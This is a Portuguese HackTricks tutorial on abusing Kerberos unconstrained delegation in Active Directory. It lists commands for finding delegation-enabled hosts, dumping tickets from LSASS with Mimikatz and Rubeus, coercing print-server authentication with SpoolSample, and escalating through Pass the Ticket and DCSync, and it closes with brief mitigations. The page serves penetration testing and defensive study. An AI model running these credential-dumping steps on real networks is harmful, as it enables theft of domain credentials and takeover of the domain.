# Delegação sem restrições

Esta é uma funcionalidade que um Administrador de Domínio pode definir para qualquer **Computador** dentro do domínio. Então, sempre que um **usuário fizer login** no computador, uma **cópia do TGT** desse usuário será enviada para o TGS fornecido pelo DC **e salva na memória em LSASS**. Portanto, se você tiver privilégios de Administrador na máquina, poderá **despejar os tickets e se passar pelos usuários** em qualquer máquina.

Portanto, se um administrador de domínio fizer login em um computador com a funcionalidade "Delegação sem restrições" ativada, e você tiver privilégios de administrador local dentro dessa máquina, poderá despejar o ticket e se passar pelo Administrador de Domínio em qualquer lugar (privesc de domínio).

Você pode **encontrar objetos de computador com esse atributo** verificando se o atributo [userAccountControl](https://msdn.microsoft.com/en-us/library/ms680832\(v=vs.85\).aspx) contém [ADS\_UF\_TRUSTED\_FOR\_DELEGATION](https://msdn.microsoft.com/en-us/library/aa772300\(v=vs.85\).aspx). Você pode fazer isso com um filtro LDAP de ‘(userAccountControl:1.2.840.113556.1.4.803:=524288)’, que é o que o powerview faz:

<pre class="language-bash"><code class="lang-bash"># Listar computadores sem restrições
## Powerview
Get-NetComputer -Unconstrained #DCs sempre aparecem, mas não são úteis para privesc
<strong>## ADSearch
</strong>ADSearch.exe --search "(&#x26;(objectCategory=computer)(userAccountControl:1.2.840.113556.1.4.803:=524288))" --attributes samaccountname,dnshostname,operatingsystem
<strong># Exportar tickets com Mimikatz
</strong>privilege::debug
sekurlsa::tickets /export #Forma recomendada
kerberos::list /export #Outra forma

# Monitorar logins e exportar novos tickets
.\Rubeus.exe monitor /targetuser:&#x3C;username> /interval:10 #Verificar a cada 10s novos TGTs</code></pre>

Carregue o ticket do Administrador (ou usuário vítima) na memória com **Mimikatz** ou **Rubeus para um** [**Pass the Ticket**](pass-the-ticket.md)**.**\
Mais informações: [https://www.harmj0y.net/blog/activedirectory/s4u2pwnage/](https://www.harmj0y.net/blog/activedirectory/s4u2pwnage/)\
[**Mais informações sobre delegação sem restrições em ired.team.**](https://ired.team/offensive-security-experiments/active-directory-kerberos-abuse/domain-compromise-via-unrestricted-kerberos-delegation)

### **Forçar autenticação**

Se um invasor conseguir **comprometer um computador permitido para "Delegação sem restrições"**, ele poderia **enganar** um **servidor de impressão** para **fazer login automaticamente** contra ele **salvando um TGT** na memória do servidor.\
Em seguida, o invasor poderia realizar um ataque de **Pass the Ticket para se passar** pela conta de computador do servidor de impressão.

Para fazer com que um servidor de impressão faça login em qualquer máquina, você pode usar o [**SpoolSample**](https://github.com/leechristensen/SpoolSample):
```bash
.\SpoolSample.exe <printmachine> <unconstrinedmachine>
```
Se o TGT for de um controlador de domínio, você pode realizar um ataque [**DCSync**](acl-persistence-abuse/#dcsync) e obter todos os hashes do DC.\
[**Mais informações sobre este ataque em ired.team.**](https://ired.team/offensive-security-experiments/active-directory-kerberos-abuse/domain-compromise-via-dc-print-server-and-kerberos-delegation)

**Aqui estão outras maneiras de tentar forçar uma autenticação:**

{% content-ref url="printers-spooler-service-abuse.md" %}
[printers-spooler-service-abuse.md](printers-spooler-service-abuse.md)
{% endcontent-ref %}

### Mitigação

* Limite os logins de DA/Admin a serviços específicos
* Defina "A conta é sensível e não pode ser delegada" para contas privilegiadas.

<details>

<summary><a href="https://cloud.hacktricks.xyz/pentesting-cloud/pentesting-cloud-methodology"><strong>☁️ HackTricks Cloud ☁️</strong></a> -<a href="https://twitter.com/hacktricks_live"><strong>🐦 Twitter 🐦</strong></a> - <a href="https://www.twitch.tv/hacktricks_live/schedule"><strong>🎙️ Twitch 🎙️</strong></a> - <a href="https://www.youtube.com/@hacktricks_LIVE"><strong>🎥 Youtube 🎥</strong></a></summary>

* Você trabalha em uma **empresa de segurança cibernética**? Você quer ver sua **empresa anunciada no HackTricks**? ou quer ter acesso à **última versão do PEASS ou baixar o HackTricks em PDF**? Confira os [**PLANOS DE ASSINATURA**](https://github.com/sponsors/carlospolop)!
* Descubra [**A Família PEASS**](https://opensea.io/collection/the-peass-family), nossa coleção exclusiva de [**NFTs**](https://opensea.io/collection/the-peass-family)
* Adquira o [**swag oficial do PEASS & HackTricks**](https://peass.creator-spring.com)
* **Junte-se ao** [**💬**](https://emojipedia.org/speech-balloon/) [**grupo do Discord**](https://discord.gg/hRep4RUj7f) ou ao [**grupo do telegram**](https://t.me/peass) ou **siga-me** no **Twitter** [**🐦**](https://github.com/carlospolop/hacktricks/tree/7af18b62b3bdc423e11444677a6a73d4043511e9/\[https:/emojipedia.org/bird/README.md)[**@carlospolopm**](https://twitter.com/hacktricks_live)**.**
* **Compartilhe suas técnicas de hacking enviando PRs para o [repositório hacktricks](https://github.com/carlospolop/hacktricks) e [hacktricks-cloud repo](https://github.com/carlospolop/hacktricks-cloud)**.

</details>
